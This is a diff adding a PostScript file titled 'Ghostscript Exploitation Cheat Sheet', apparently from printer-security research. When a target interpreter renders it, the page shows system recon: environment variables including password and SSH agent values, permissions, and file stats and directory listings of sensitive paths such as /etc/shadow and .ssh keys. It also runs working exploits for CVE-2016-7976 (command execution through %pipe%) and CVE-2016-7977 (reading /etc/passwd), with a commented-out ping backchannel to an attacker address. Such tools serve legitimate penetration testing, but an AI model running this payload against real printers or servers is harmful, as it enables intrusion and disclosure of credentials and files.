@@ -1,0 +1,811 @@
+%!
+
+% --------------------------------------------------------- %
+% --------[ Ghostscript Exploitation Cheat Sheet ]--------- %
+% created by <jens.a.mueller@rub.de> | hacking-printers.net %
+% --------------------------------------------------------- %
+
+% define string
+/str 65535 string def
+
+% given token split to strings
+/strsplit {[3 1 roll {search {3 1 roll}{exit} ifelse} loop]} def
+
+% concatenate two strings
+/strcat {exch dup length 2 index length add string dup
+dup 4 2 roll copy length 4 -1 roll putinterval} def
+
+% concatenate two arrays
+/arrcat {exch 2 copy length exch length add array dup
+dup 5 2 roll copy length exch putinterval} bind def
+
+% get human readable bytesize
+/size {/mb 1048576 def /kb 100 def dup mb div cvi str cvs
+(.) strcat exch kb mod cvi str cvs strcat (M) strcat} def
+
+% set default coordinates and counters
+/x 30 def /y 730 def /row 0 def /col 0 def
+
+% draw a single string
+/draw {
+  y 10 lt {showpage /y 730 def} if x y moveto show /y y 5 sub def
+  /row row 1 add def row 140 mod 0 eq {/x x 194 add def /y 730 def} if
+} def
+
+% draw string but crop if to long
+/cdraw {str cvs dup length 50 gt {0 50 getinterval draw}{draw} ifelse} def
+
+% draw string but break if to long
+/bdraw {str cvs dup length 50 gt {dup dup 0 50 getinterval draw length
+50 sub 50 exch getinterval (  ) exch strcat bdraw}{draw} ifelse} def
+
+% draw newline
+/newline {() draw} def
+
+% draw error
+/errmsg {(*** Error occured on execution ***) cdraw} def
+
+% draw in color
+/red {0.7 0 0 setrgbcolor cdraw 0 0 0 setrgbcolor} def
+/bred {0.7 0 0 setrgbcolor bdraw 0 0 0 setrgbcolor} def
+/green {0 0.5 0 setrgbcolor cdraw 0 0 0 setrgbcolor} def
+
+% set font type and size, draw title
+/Helvetica findfont 33.5 scalefont setfont
+(Ghostscript Exploitation Cheat Sheet) 30 750 moveto show
+/Courier findfont 6 scalefont setfont
+
+% assume -dSAFER by default
+/unsafe false def /setunsafe {/unsafe true def} def
+/fp {unsafe {(May be false positive because -dSAFER is missing) draw} if} def
+
+% ======================================================================
+
+/info {
+  (--------------------------------------------------) cdraw
+  (------------[ GHOSTSCRIPT VERSION ] --------------) cdraw
+  (--------------------------------------------------) cdraw
+  product ( ) strcat revision str cvs strcat
+  ( | PostScript version ) strcat version strcat cdraw
+} def
+
+
+% ======================================================================
+
+/arch {
+  (--------------------------------------------------) cdraw
+  (------------[ HOST ARCHITECTURE ] ----------------) cdraw
+  (--------------------------------------------------) cdraw
+  (Byte order: ) currentsystemparams /ByteOrder get
+  {(Little-Endian)}{(Big-Endian)} ifelse strcat cdraw
+  (Path separator: ) currentsystemparams /GenericResourcePathSep get
+  dup (/) eq {( (Posix))}{dup (\\) eq {( (Windows))}{( (Unknown))} ifelse}
+  ifelse strcat strcat cdraw
+} def
+
+
+% ======================================================================
+
+/speed {
+  (--------------------------------------------------) cdraw
+  (------------[ SPEED MEASUREMENT ] ----------------) cdraw
+  (--------------------------------------------------) cdraw
+  % we don't know if there are timeouts for the gs process
+  (Host may be prone to denial of service attacks!) red
+  /number 10000 def
+  /start realtime def
+  number
+  {
+    /chksum 16 string def
+    /md5get chksum /MD5Encode filter def
+    md5get dup (X) writestring closefile
+  } repeat
+  /duration realtime start sub def
+  (Calculating ) number str cvs strcat ( MD5 checksums took us )
+  strcat duration str cvs strcat (ms) strcat cdraw
+} def
+
+
+% ======================================================================
+
+/dirs {
+  (--------------------------------------------------) cdraw
+  (------------[ GHOSTSCRIPT DIRECTORIES ] ----------) cdraw
+  (--------------------------------------------------) cdraw
+  (Resources: ) currentsystemparams /GenericResourceDir get strcat cdraw
+  (Fonts: ) currentsystemparams /FontResourceDir get strcat cdraw
+} def
+
+
+% ======================================================================
+
+/date {
+  (--------------------------------------------------) cdraw
+  (------------[ HOST SYSTEM TIME ] -----------------) cdraw
+  (--------------------------------------------------) cdraw
+  (Local time: ) 
+  (%Calendar%) currentdevparams /Year   get str cvs strcat (-) strcat
+  (%Calendar%) currentdevparams /Month  get str cvs strcat (-) strcat
+  (%Calendar%) currentdevparams /Day    get str cvs strcat ( ) strcat
+  (%Calendar%) currentdevparams /Hour   get str cvs strcat (:) strcat
+  (%Calendar%) currentdevparams /Minute get str cvs strcat (:) strcat
+  (%Calendar%) currentdevparams /Second get str cvs strcat cdraw
+  (Interpreter running since ) realtime str cvs strcat (ms) strcat cdraw
+} def
+
+
+% ======================================================================
+
+/free {
+  (--------------------------------------------------) cdraw
+  (------------[ INTERPRETER MEMORY ] ---------------) cdraw
+  (--------------------------------------------------) cdraw
+  vmstatus ([VM] max: ) exch size strcat
+  ( | used: ) 3 2 roll size strcat strcat
+  ( | nesting level: ) 3 2 roll str cvs strcat strcat cdraw
+  % ([RAM] size: ) currentsystemparams /RamSize get size strcat cdraw
+  % newline ([Font cache]) cdraw cachestatus
+  % str cvs (blimit: ) exch strcat cdraw
+  % str cvs (cmax: )   exch strcat cdraw
+  % str cvs (csize: )  exch strcat cdraw
+  % str cvs (mmax: )   exch strcat cdraw
+  % str cvs (msize: )  exch strcat cdraw
+  % str cvs (bmax: )   exch strcat cdraw
+  % str cvs (bsize: )  exch strcat cdraw
+  % newline ([User cache]) cdraw ucachestatus
+  % str cvs (blimit: ) exch strcat cdraw
+  % str cvs (rmax: )   exch strcat cdraw
+  % str cvs (rsize: )  exch strcat cdraw
+  % str cvs (bmax: )   exch strcat cdraw
+  % str cvs (bsize: )  exch strcat cdraw
+} def
+
+
+% ======================================================================
+
+/volume {
+  (--------------------------------------------------) cdraw
+  (------------[ HOST %OS% VOLUME ] -----------------) cdraw
+  (--------------------------------------------------) cdraw
+  (%os%) currentdevparams {exch 128 string cvs (: ) strcat exch str cvs strcat cdraw} forall
+  % (LogicalSize: ) (%os%) currentdevparams /LogicalSize get size strcat cdraw
+  % (BlockSize: ) (%os%) currentdevparams /BlockSize get size strcat cdraw
+  % (Free: ) (%os%) currentdevparams /Free get size strcat cdraw
+} def
+
+
+% ======================================================================
+
+/dumpenv {
+  (--------------------------------------------------) cdraw
+  (------------[ ENVIRONMENT VARIABLES ] ------------) cdraw
+  (--------------------------------------------------) cdraw
+  [
+    (_)
+    (BASH_ENV)
+    (BASHOPTS)
+    (BASH_VERSINFO)
+    (BASH_VERSION)
+    (BROWSER)
+    (CC)
+    (CDPATH)
+    (CDPATH_)
+    (CFLAGS)
+    (COLORTERM)
+    (COLUMNS)
+    (CPATH)
+    (CPPFLAGS)
+    (CXX)
+    (CXXFLAGS)
+    (DBUS_SESSION_BUS_ADDRESS)
+    (DESKTOP_SESSION)
+    (DESKTOP_STARTUP_ID)
+    (DIRSTACK)
+    (DISPLAY)
+    (EDITOR)
+    (GDM_LANG)
+    (GDMSESSION)
+    (GEM_HOME)
+    (GEM_PATH)
+    (GLADE_PIXMAP_PATH)
+    (GNOME_KEYRING_CONTROL)
+    (GNOME_KEYRING_PID)
+    (GPG_AGENT_INFO)
+    (GS_CACHE_DIR)
+    (GS_DEVICE)
+    (GS_DLL)
+    (GS_FONTMAP)
+    (GS_FONTPATH)
+    (GS_LIB)
+    (GS_LOAD)
+    (GS_NOCOPY)
+    (GS_NOFILL)
+    (GS_NOOUTPUT)
+    (GS_OPTIONS)
+    (HISTFILE)
+    (HISTFILESIZE)
+    (HISTSIZE)
+    (HOME)
+    (HOSTALIASES)
+    (HOSTALIASES_)
+    (HOSTNAME)
+    (IFS)
+    (IMSETTINGS_INTEGRATE_DESKTOP)
+    (IMSETTINGS_MODULE)
+    (INCLUDE)
+    (INFOPATH)
+    (IRBRC)
+    (IST-2)
+    (JAVA_HOME)
+    (LANG)
+    (LANGUAGE)
+    (LC_ADDRESS)
+    (LC_ALL)
+    (LC_COLLATE)
+    (LC_CTYPE)
+    (LC_IDENTIFICATION)
+    (LC_MEASUREMENT)
+    (LC_MESSAGES)
+    (LC_MONETARY)
+    (LC_NAME)
+    (LC_NUMERIC)
+    (LC_PAPER)
+    (LC_TELEPHONE)
+    (LC_TIME)
+    (LD_LIBRARY_PATH)
+    (LD_PRELOAD)
+    (LESSCLOSE)
+    (LESSOPEN)
+    (LIBPATH)
+    (LIBRARY_PATH)
+    (LINES)
+    (LOGNAME)
+    (LS_COLORS)
+    (MAIL)
+    (MANPATH)
+    (MSF_DATABASE_CONFIG)
+    (MY_RUBY_HOME)
+    (NAUTILUS_SCRIPT_CURRENT_URI)
+    (NAUTILUS_SCRIPT_SELECTED_FILE_PATHS)
+    (NAUTILUS_SCRIPT_SELECTED_URIS)
+    (NAUTILUS_SCRIPT_WINDOW_GEOMETRY)
+    (NODE_PATH)
+    (OLDPWD)
+    (ORBIT_SOCKETDIR)
+    (PAGER)
+    (PASSWD)
+    (PASSWORD)
+    (PATH)
+    (PKG_CONFIG_PATH)
+    (POSIXLY_CORRECT)
+    (PS1)
+    (PWD)
+    (QT_GRAPHICSSYSTEM_CHECKED)
+    (RANDOM)
+    (RBENV_SHELL)
+    (RUBY_VERSION)
+    (rvm_bin_path)
+    (rvm_loaded_flag)
+    (rvm_path)
+    (rvm_prefix)
+    (rvm_stored_umask)
+    (rvm_user_install_flag)
+    (rvm_version)
+    (SDL_VIDEO_FULLSCREEN_DISPLAY)
+    (SHELL)
+    (SHELLOPTS)
+    (SHLVL)
+    (SSH_AGENT_PID)
+    (SSH_AUTH_SOCK)
+    (SSH_CLIENT)
+    (SSH_CONNECTION)
+    (SSH_TTY)
+    (_system_arch)
+    (_system_name)
+    (_system_type)
+    (_system_version)
+    (TERM)
+    (TERMCAP)
+    (TERMINATOR_UUID)
+    (TMOUT)
+    (TMPDIR)
+    (TZ)
+    (TZDIR)
+    (UID)
+    (USER)
+    (USER_)
+    (USERNAME)
+    (VISUAL)
+    (VISUAL_)
+    (WINDOWID)
+    (WINDOWPATH)
+    (XAUTHORITY)
+    (XDG_CACHE_HOME)
+    (XDG_CONFIG_DIRS)
+    (XDG_CONFIG_HOME)
+    (XDG_DATA_DIRS)
+    (XDG_DATA_HOME)
+    (XDG_DATA_HOME )
+    (XDG_MENU_PREFIX)
+    (XDG_RUNTIME_DIR)
+    (XDG_SEAT)
+    (XDG_SESSION_COOKIE)
+    (XDG_SESSION_DESKTOP)
+    (XDG_SESSION_ID)
+    (XDG_VTNR)
+    (XTERM_SHELL)
+  ]
+  % for all variables, try to get values
+  {dup getenv {str cvs exch (: ) strcat exch strcat bred}{pop} ifelse} forall
+} def
+
+
+% ======================================================================
+
+/params {
+  (--------------------------------------------------) cdraw
+  (------------[ CURRENT SYSTEM PARAMS ] ------------) cdraw
+  (--------------------------------------------------) cdraw
+  currentsystemparams {exch str cvs (: ) strcat exch str cvs strcat cdraw} forall
+} def
+
+
+% ======================================================================
+
+/args {
+  (--------------------------------------------------) cdraw
+  (------------[ COMMAND LINE ARGUMENTS ] -----------) cdraw
+  (--------------------------------------------------) cdraw
+  [
+    (BATCH)
+    (DELAYBIND)
+    (DELAYSAFER)
+    (DISKFONTS)
+    (DISPLAYING)
+    (DOPS)
+    (ESTACKPRINT)
+    (FAKEFONTS)
+    (FIXEDMEDIA)
+    (FIXEDRESOLUTION)
+    (INTERPOLATE)
+    (JOBSERVER)
+    (LOCALFONTS)
+    (NOBIND)
+    (NOCACHE)
+    (NOCCFONTS)
+    (NOCIE)
+    (NOFONTMAP)
+    (NOFONTPATH)
+    (NOGC)
+    (NOMEDIAATTRS)
+    (NOOUTERSAVE)
+    (NOPAGEPROMPT)
+    (NOPAUSE)
+    (NOPLATFONTS)
+    (NOPROMPT)
+    (NOPSICC)
+    (NOSAFER)
+    (NOSUBSTDEVICECOLORS)
+    (NOTRANSPARENCY)
+    (ORIENT1)
+    (OSTACKPRINT)
+    (OutputFile)
+    (QUIET)
+    (RENDERTTNOTDEF)
+    (SHORTERRORS)
+    (STRICT)
+    (TTYPAUSE)
+    (WRITESYSTEMDICT)
+  ]
+  (Input file: ) currentfile .filename {}{(reading from stdin)} ifelse strcat bdraw
+  (Parameters: ) SAFER {(-dSAFER set) strcat green}{(-dSAFER missing!) strcat red setunsafe} ifelse
+  % for all parameters, show if enabled
+  {{dup cvx exec {str cvs (            ) exch strcat cdraw} if} stopped pop} forall clear
+} def
+
+
+% ======================================================================
+
+/libpath {
+  (--------------------------------------------------) cdraw
+  (------------[ GHOSTSCRIPT LIBPATH ] --------------) cdraw
+  (--------------------------------------------------) cdraw
+  /LIBPATH .systemvar {bdraw} forall
+} def
+
+
+% ======================================================================
+
+/dicts {
+  (--------------------------------------------------) cdraw
+  (------------[ KNOWN DICTIONARIES ] ---------------) cdraw
+  (--------------------------------------------------) cdraw
+  (acl   len   max  dictionary) cdraw
+  (===========================) cdraw
+  /format {dup length 5 exch sub ( ) exch {( ) strcat} repeat} def
+  /dictinfo {
+    dup dup dup dup
+    rcheck {(r)}{(-)} ifelse 5 4 roll
+    wcheck {(w)}{(-)} ifelse strcat 4 3 roll
+    xcheck {(x)}{(-)} ifelse strcat 3 2 roll
+    length str cvs format exch strcat strcat exch
+    maxlength str cvs format exch strcat strcat
+  } def
+  systemdict              dictinfo (  systemdict)          strcat bdraw
+  statusdict              dictinfo (  statusdict)          strcat bdraw
+  userdict                dictinfo (  userdict)            strcat bdraw
+  globaldict              dictinfo (  globaldict)          strcat bdraw
+  serverdict              dictinfo (  serverdict)          strcat bdraw
+  errordict               dictinfo (  errordict)           strcat bdraw
+  1183615869 internaldict dictinfo (  internaldict)        strcat bdraw
+  currentpagedevice       dictinfo (  currentpagedevice)   strcat bdraw
+  currentuserparams       dictinfo (  currentuserparams)   strcat bdraw
+  currentsystemparams     dictinfo (  currentsystemparams) strcat bdraw
+} def
+
+
+% ======================================================================
+
+/perms {
+  (--------------------------------------------------) cdraw
+  (------------[ GHOSTSCRIPT PERMISSIONS ] ----------) cdraw
+  (--------------------------------------------------) cdraw
+  /severity {dup length 0 eq {(Not allowed at all) green} if
+  {dup (*) eq {(Whole filesystem!) red pop}{cdraw} ifelse} forall} def
+  (===================== Exec =======================) cdraw
+  {(%pipe%/bin/nonexistent) (w) file pop (Arbitrary commands!) red}
+  stopped {(Not allowed at all) green} if
+  (===================== Delete =====================) cdraw
+  currentuserparams /PermitFileControl get severity
+  (===================== Write ======================) cdraw
+  currentuserparams /PermitFileWriting get severity
+  (===================== Read =======================) cdraw
+  currentuserparams /PermitFileReading get severity 
+} def
+
+
+% ======================================================================
+
+/stat {
+  (--------------------------------------------------) cdraw
+  (------------[ SIZE, CTIME, MTIME, NAME ] ---------) cdraw
+  (--------------------------------------------------) cdraw
+  [
+    (\\)
+    (/)
+    (*)
+    (~)
+    (.)
+    (..)
+    (./..)
+    (../../../../../../../../*)
+    (file:///)
+
+    (tmp)
+    (lib)
+    (iccprofiles)
+    (Resource)
+    (Resource/Decoding)
+    (Resource/Encoding)
+    (Resource/Font)
+    (Resource/Init)
+    (gs_init.ps)
+
+    (.bashrc)
+    (.config)
+    (.local)
+    (.logout)
+    (.profile)
+    (.ssh)
+    (.ssh/)
+    (.ssh/id_dsa)
+    (.ssh/id_dsa)
+    (.ssh/known_hosts)
+
+    (/bin)
+    (/dev)
+    (/home)
+    (/lib)
+    (/mnt)
+    (/proc)
+    (/run)
+    (/selinux)
+    (/sys)
+    (/tmp)
+    (/var)
+    (/boot)
+    (/etc)
+    (/media)
+    (/opt)
+    (/rescue)
+    (/root)
+    (/sbin)
+    (/srv)
+    (/usr)
+    (/vmlinuz)
+
+    (/bin/ls)
+    (/bin/sh)
+    (/bin/bash)
+    (/bin/ping)
+
+    (/etc/aliases)
+    (/etc/alternatives)
+    (/etc/apache2)
+    (/etc/apt)
+    (/etc/bash.bashrc)
+    (/etc/crontab)
+    (/etc/debian_version)
+    (/etc/default)
+    (/etc/dpkg)
+    (/etc/fstab)
+    (/etc/group)
+    (/etc/hosts)
+    (/etc/inittab)
+    (/etc/issue)
+    (/etc/master.passwd)
+    (/etc/motd)
+    (/etc/network)
+    (/etc/passwd)
+    (/etc/rc.local)
+    (/etc/resolv.conf)
+    (/etc/selinux)
+    (/etc/services)
+    (/etc/shadow)
+    (/etc/shells)
+    (/etc/sudoers)
+  ]
+  % for all filenames, show size, atime, mtime and name
+  {dup status {str cvs ( ) strcat exch str cvs strcat 3 1 roll str
+  cvs ( ) strcat 3 2 roll strcat ( ) strcat 3 2 roll strcat bred pop}
+  {pop} ifelse} forall
+} def
+
+
+% ======================================================================
+
+% TBD: print MD5SUM of file, so one can easily check on http://nsrl.hashsets.com/
+/readfile {
+  (--------------------------------------------------) cdraw
+  (------------[ CUSTOM GS_INIT.PS? ] ---------------) cdraw
+  (--------------------------------------------------) cdraw
+  /found false def
+  /LIBPATH .systemvar
+  { currentsystemparams /GenericResourcePathSep get strcat (gs_init.ps) strcat
+    dup status {pop pop pop pop (r) file 8 {dup str readline {cdraw}{pop} ifelse}
+    repeat closefile ([...]) cdraw /found true def exit}{pop} ifelse
+  } forall
+  found not {(Could not find or open init file) green} if
+} def
+
+% ======================================================================
+
+/cve-2016-7976 {
+  (--------------------------------------------------) cdraw
+  (------------[ CVE-2016-7976 (RCE) ] --------------) cdraw
+  (--------------------------------------------------) cdraw
+  /cve_exec {
+    (Executing: ) cmd strcat cdraw
+    {currentdevice null true mark /PostRenderProfile cmd .putdeviceparams} stopped clear
+    {currentdevice null true mark /ProofProfile      cmd .putdeviceparams} stopped clear
+    {currentdevice null true mark /DeviceLinkProfile cmd .putdeviceparams} stopped clear
+  % {currentdevice null true mark /OutputICCProfile  cmd .putdeviceparams} stopped clear % coredump!
+    {currentdevice null true mark /GraphicICCProfile cmd .putdeviceparams} stopped clear
+    {currentdevice null true mark /ImageICCProfile   cmd .putdeviceparams} stopped clear
+    {currentdevice null true mark /TextICCProfile    cmd .putdeviceparams} stopped clear
+  } def
+
+  % try to get backchannel using system environment variable
+  % /variable (TEST_) realtime str cvs strcat def
+  % edit: won't work because the process has its own environment
+  % /cmd (%pipe%) variable strcat (=TRUE) strcat def cve_exec
+  % pause for 2000 milliseconds
+  % 2000 realtime add {dup realtime le {exit} if} loop
+  % variable getenv {str cvs exch (: ) strcat exch strcat cdraw}{(Not vulnerable) cdraw pop} ifelse
+  % newline
+
+  % try to get backchannel using system temporary file
+  /filename (TEST_) realtime str cvs strcat def
+  /cmd (%pipe%touch /tmp/) filename strcat def cve_exec
+  (/tmp/) filename strcat status {
+    pop pop pop pop (Vulnerable to arbitrary command execution!) red}{(Not vulnerable) green
+  } ifelse
+  /cmd (%pipe%rm -f /tmp/) filename strcat def cve_exec
+
+  % may also try to get a backchannel via the internet
+  % /cmd (%pipe%ping MY_IP) def cve_exec
+} def
+
+
+% ======================================================================
+
+/cve-2016-7977 {
+  (--------------------------------------------------) cdraw
+  (------------[ CVE-2016-7977 (LFI) ] --------------) cdraw
+  (--------------------------------------------------) cdraw
+  1 {
+    /lfi {{str readstring pop (\n) strsplit {red} forall} if fp exit} def
+    % strategy #1: read /etc/passwd using .libfile
+    {(/etc/passwd) .libfile} stopped {clear}{lfi} ifelse
+    % strategy #2: read /etc/passwd using findlibfile
+    {(/etc/passwd) findlibfile} stopped {clear}{lfi} ifelse
+    % strategy #3: read /proc/self/status using .libfile
+    {(/proc/self/status) .libfile} stopped {clear}{lfi} ifelse
+    % strategy #4: read /proc/self/status using findlibfile
+    {(/proc/self/status) findlibfile} stopped {clear}{lfi} ifelse
+    % finally we get here
+    (Not vulnerable) green
+  } repeat
+} def
+
+
+% ======================================================================
+
+/dirlist {
+  (--------------------------------------------------) cdraw
+  (------------[ DIRECTORY LISTINGS ] ---------------) cdraw
+  (--------------------------------------------------) cdraw
+  [
+    % don't use this to avoid DoSing recursive interpreters
+    % (../../../../../../../*)
+    % use this instead to get root directory listing
+    (../../../../../../../../../../???)
+    (../../../../../../../../../../???/)
+    (../../../../../../../../../../????)
+    (../../../../../../../../../../????/)
+    (../../../../../../../../../../?????)
+    (../../../../../../../../../../?????/)
+    (../../../../../../../../../../??????)
+    (../../../../../../../../../../??????/)
+    (../../../../../../../../../../???????)
+    (../../../../../../../../../../???????/)
+    (../../../../../../../../../../????????)
+    (../../../../../../../../../../????????/)
+    (../../../../../../../../../../?????????)
+    (../../../../../../../../../../?????????/)
+    (../../../../../../../../../../??????????)
+    (../../../../../../../../../../??????????/)
+    (../../../../../../../../../../???????????)
+    (../../../../../../../../../../???????????/)
+    (../../../../../../../../../../????????????)
+    (../../../../../../../../../../????????????/)
+    (../../../../../../../../../../?????????????)
+    (../../../../../../../../../../?????????????/)
+    (../../../../../../../../../../??????????????)
+    (../../../../../../../../../../??????????????/)
+    (../../../../../../../../../../???????????????)
+    (../../../../../../../../../../???????????????/)
+    (../../../../../../../../../../????????????????)
+    (../../../../../../../../../../????????????????/)
+
+    (\\)
+    (/)
+    (*)
+    (?)
+    (??)
+    (???)
+    (????)
+    (?????)
+    (??????)
+    (???????)
+    (????????)
+    (?????????)
+    (??????????)
+    (???????????)
+    (????????????)
+    (?????????????)
+    (~)
+    (.)
+    (..)
+    (./..)
+    (file:///)
+
+    (tmp)
+    (lib)
+    (iccprofiles)
+    (Resource)
+    (Resource/Decoding)
+    (Resource/Encoding)
+    (Resource/Font)
+    (Resource/Init)
+    (gs_init.ps)
+
+    (.bashrc)
+    (.config)
+    (.local)
+    (.logout)
+    (.profile)
+    (.ssh)
+    (.ssh/)
+    (.ssh/id_dsa)
+    (.ssh/id_dsa)
+    (.ssh/known_hosts)
+
+    (/bin)
+    (/dev)
+    (/home)
+    (/lib)
+    (/mnt)
+    (/proc)
+    (/run)
+    (/selinux)
+    (/sys)
+    (/tmp)
+    (/var)
+    (/boot)
+    (/etc)
+    (/media)
+    (/opt)
+    (/rescue)
+    (/root)
+    (/sbin)
+    (/srv)
+    (/usr)
+    (/vmlinuz)
+
+    (/bin/ls)
+    (/bin/sh)
+    (/bin/bash)
+    (/bin/ping)
+
+    (/etc/aliases)
+    (/etc/alternatives)
+    (/etc/apache2)
+    (/etc/apt)
+    (/etc/bash.bashrc)
+    (/etc/crontab)
+    (/etc/debian_version)
+    (/etc/default)
+    (/etc/dpkg)
+    (/etc/fstab)
+    (/etc/group)
+    (/etc/hosts)
+    (/etc/inittab)
+    (/etc/issue)
+    (/etc/master.passwd)
+    (/etc/motd)
+    (/etc/network)
+    (/etc/passwd)
+    (/etc/rc.local)
+    (/etc/resolv.conf)
+    (/etc/selinux)
+    (/etc/services)
+    (/etc/shadow)
+    (/etc/shells)
+    (/etc/sudoers)
+    (/etc/*/)
+  ]
+  % add pathnames where we're permitted to read files
+  {currentuserparams /PermitFileReading get arrcat} stopped pop
+
+  % add library pathnames
+  {/LIBPATH .systemvar arrcat} stopped pop
+
+  % make sure we don't cause DoS on recursive interpreters
+  /limit 500 def /counter 0 def /increment {/counter counter 1 add def} def
+  % for all filenames/dirnames try to list filenames/contained files
+  {{{bred increment counter limit ge {exit} if} str filenameforall} stopped pop} forall
+} def
+
+% ======================================================================
+
+        {info}          stopped {errmsg} if
+newline {free}          stopped {errmsg} if
+newline {arch}          stopped {errmsg} if
+newline {date}          stopped {errmsg} if
+newline {speed}         stopped {errmsg} if
+newline {args}          stopped {errmsg} if
+newline {dicts}         stopped {errmsg} if
+newline {dirs}          stopped {errmsg} if
+newline {libpath}       stopped {errmsg} if
+newline {dumpenv}       stopped {errmsg} if
+% newline {volume}      stopped {errmsg} if
+% newline {params}      stopped {errmsg} if
+newline {perms}         stopped {errmsg} if
+newline {stat}          stopped {errmsg} if
+newline {readfile}      stopped {errmsg} if
+newline {cve-2016-7976} stopped {errmsg} if
+newline {cve-2016-7977} stopped {errmsg} if
+newline {dirlist}       stopped {errmsg} if
+
+showpage
